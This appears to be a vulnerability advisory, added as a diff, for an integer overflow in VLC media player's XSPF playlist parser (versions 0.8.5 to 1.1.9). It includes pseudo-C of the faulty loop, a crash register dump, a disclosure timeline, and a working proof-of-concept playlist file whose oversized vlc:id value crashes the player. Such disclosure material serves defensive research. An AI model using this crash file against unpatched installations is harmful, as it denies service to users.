@@ -1,0 +1,130 @@
+TITLE 
+
+	VLC Media Player XSPF Local File Integer overflow in XSPF playlist parser
+
+AFFECTED VERSIONS
+
+	VLC media player 1.1.9 down to 0.8.5
+
+VENDOR
+
+	VideoLAN Organisation
+
+CLASS
+
+	Denial of Service (DoS)
+
+RESOURCES
+
+	http://www.videolan.org/security/sa1104.html
+
+
+PRODUCT DESCRIPTION
+	
+	VLC is a free and open source cross-platform multimedia player and
+	framework that plays most multimedia files as well as DVD, Audio CD,
+	VCD, and various streaming protocols.
+
+TECHNICAL DETAILS
+
+	XSPF file is the XML format for sharing playlists.
+	A sample of the XSPF document is as follows:
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<playlist version="1" xmlns="http://xspf.org/ns/0/">
+	    <trackList>
+		<track><location>file:///crash/tecr0c.mp3</location></track>
+	    </trackList>
+	</playlist>
+
+	The VLC XSPF file uses a tag <vlc:id></vlc:id> in the component Demuxers: Playlist 
+	which accepts decimal values for the vlc:id. When entering a large value that is 
+	beyond the memory segment that is allocated for program data the program crashes.
+	Setting <vlc:id> value to 1073741823,e.g. <vlc:id>1073741823</vlc:id> 
+	will results in a MEMORY ACCESS VIOLATION and the application crash.
+
+	The vulnerable code in module libplaylist_plugin.dll looks like (pseudo C code example):
+
+                do
+                {
+                  __counter += 8;
+                  mem->dword0 = 0;
+                  mem->dword4 = 0;
+                  mem->dword8 = 0;
+                  mem->dwordC = 0;
+                  mem->dword10 = 0;
+                  mem->dword14 = 0;
+                  mem->dword18 = 0;
+                  mem->dword1C = 0;
+                  ++mem; <-- violation happens here when mem value is greater then memory segment
+                }
+                while ( __counter <= __controlled_value_edx );
+              }
+            };
+
+	Once we hit an address that does not exist we will result in a Denial of Service condition.
+
+	EAX 01A97FE8
+	ECX 00003320
+	EDX 3FFFFFFF <--------------- Value we control
+	EBX 01A972F8
+	ESP 02B6FBA8
+	EBP 02B6FCC0
+	ESI 00000007
+	EDI 01A8B388
+	EIP 7024FA5E libplayl.7024FA5E
+	C 0  ES 0023 32bit 0(FFFFFFFF)
+	P 0  CS 001B 32bit 0(FFFFFFFF)
+	A 1  SS 0023 32bit 0(FFFFFFFF)
+	Z 0  DS 0023 32bit 0(FFFFFFFF)
+	S 0  FS 003B 32bit 7FFAF000(FFF)
+	T 0  GS 0000 NULL
+	D 0
+	O 0  LastErr ERROR_SUCCESS (00000000)
+	EFL 00010212 (NO,NB,NE,A,NS,PO,GE,G)
+	ST0 empty +UNORM 6900 00AECAB0 00ADEB10
+	ST1 empty +UNORM 000B 003F0428 694C2808
+	ST2 empty -UNORM EB10 00AECAB0 00ADEB10
+	ST3 empty 0.9999999999999573674
+	ST4 empty 0.5000000000000000000
+	ST5 empty 0.9999999999999573674
+	ST6 empty 0.0
+	ST7 empty 559.00000000000000000
+        	       3 2 1 0      E S P U O Z D I
+	FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT)
+	FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+	
+	End of block:
+	01A97FE8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+	01A97FF8  00 00 00 00 00 00 00 00                          ........
+
+PROOF OF CONCEPT (PoC)
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<playlist version="1" xmlns="http://xspf.org/ns/0/" xmlns:vlc="http://www.videolan.org/vlc/playlist/ns/0/">
+		<title>Playlist</title>
+		<trackList>
+			<track>
+				<location>file:///C:/Users/tecr0c/Desktop/tecr0c-win.mp3</location>
+				<duration>992</duration>
+				<extension application="http://www.videolan.org/vlc/playlist/0">
+					<vlc:id>1073741823</vlc:id>
+				</extension>
+			</track>
+		</trackList>
+		<extension application="http://www.videolan.org/vlc/playlist/0">
+				<vlc:item tid="0" />
+		</extension>
+	</playlist>
+
+FIX
+
+	VLC Media Player 1.1.10
+
+TIMELINE
+
+	03062011	Contacted vendor with PoC
+	05062011	Bug fixed by vendor
+	08062011	Patch release to public in 1.1.10
+
